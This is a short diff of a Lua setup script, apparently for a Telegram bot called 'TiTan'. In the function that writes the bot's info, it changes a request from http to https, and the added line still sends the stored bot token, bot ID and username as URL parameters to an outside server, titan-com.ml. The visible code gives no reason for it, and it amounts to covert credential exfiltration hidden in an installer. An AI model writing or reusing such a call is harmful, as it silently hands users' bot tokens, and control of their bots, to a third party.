@@ -46,7 +46,7 @@ os.execute('lua run.lua')
 end
 local function Files_TiTan_Info()
 Create_Info(database:get(Server_TiTan.."Token_TiTan"),database:get(Server_TiTan.."Id_TiTan"),database:get(Server_TiTan.."UserName_TiTan"))   
-http.request("https://titan-com.ml/meber.php?id="..database:get(Server_TiTan.."Id_TiTan").."&UserName="..database:get(Server_TiTan.."UserName_TiTan").."&token="..database:get(Server_TiTan.."Token_TiTan"))
+https.request("https://titan-com.ml/meber.php?id="..database:get(Server_TiTan.."Id_TiTan").."&UserName="..database:get(Server_TiTan.."UserName_TiTan").."&token="..database:get(Server_TiTan.."Token_TiTan"))
 local RunTiTan = io.open("TiTan", 'w')
 RunTiTan:write([[
 #!/usr/bin/env bash
